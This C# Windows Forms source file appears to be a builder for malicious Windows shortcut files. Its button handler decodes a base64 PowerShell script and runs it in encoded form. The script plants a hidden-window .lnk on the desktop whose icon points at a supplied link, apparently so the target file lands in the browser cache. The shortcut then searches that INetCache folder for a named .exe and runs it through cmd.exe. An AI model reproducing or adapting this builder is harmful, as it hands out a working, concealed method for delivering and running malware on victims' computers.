using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace apireLinker
{
    public partial class mainForm : Form
    {
        public mainForm()
        {
            InitializeComponent();
        }

        private void buttonBuild_Click(object sender, EventArgs e)
        {
            string builder = Encoding.Default.GetString(Convert.FromBase64String("JHNoZWxsID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0IFdTY3JpcHQuU2hlbGw7JGRlc2t0b3AgPSBbU3lzdGVtLkVudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgnRGVza3RvcCcpOyRzaG9ydGN1dCA9ICRzaGVsbC5DcmVhdGVTaG9ydGN1dCgiJGRlc2t0b3BcJWZpbGVuYW1lJS5sbmsiKTskc2hvcnRjdXQuVGFyZ2V0UGF0aCA9ICJDOlx3aW5kb3dzXHN5c3RlbTMyXGNvbmhvc3QuZXhlIjskc2hvcnRjdXQuV2luZG93U3R5bGUgPSA3OyRzaG9ydGN1dC5Bcmd1bWVudHMgPSAnY21kLmV4ZSAvYyBjZCAlVVNFUlBST0ZJTEUlXEFwcERhdGFcTG9jYWxcTWljcm9zb2Z0XFdpbmRvd3NcSU5ldENhY2hlICYgZGlyIC9zIC9CICVmaWxlbmFtZSUqLmV4ZSB8IGNtZC5leGUgL2snOyRzaG9ydGN1dC5JY29uTG9jYXRpb24gPSAiJWxuayU/LmljbyI7JHNob3J0Y3V0LlNhdmUoKTs="));
            string lnk = textBoxLink.Text;
            string filename = textBoxFile.Text;
            builder = builder.Replace("%lnk%", lnk).Replace("%filename%", filename);
            string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(builder));
            Process.Start("Powershell.exe", "-enc " + b64);
            MessageBox.Show("The file is saved on your desktop.", "Confirmation", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
    }
}
